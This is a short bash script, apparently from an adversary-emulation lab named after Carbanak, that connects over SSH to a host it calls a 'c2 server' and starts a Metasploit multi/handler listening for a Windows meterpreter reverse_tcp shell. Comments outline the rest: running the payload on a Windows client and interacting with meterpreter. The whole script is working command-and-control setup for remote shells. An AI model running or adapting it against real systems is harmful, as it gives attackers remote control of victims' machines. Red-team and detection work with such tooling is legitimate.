#!/bin/bash

echo "connecting to c2 server..."

ssh -i "carbanaktest2.pem" kali@ec2-35-171-225-42.compute-1.amazonaws.com 'bash -s' << 'ENDSSH'
  echo "connected to c2 server"
  sudo msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lport 8080;set lhost 192.168.0.4;set ExitOnSession False;exploit -j"


# $echo <password> | sudo -S <command>
# tmux
# start metasploit - done
# input listener details - done
# start handler (exploit)
# switch tab
# ssh into windows client
# run payload
# switch tab
# interact with meterpreter
# exit
# quit metasploit
ENDSSH
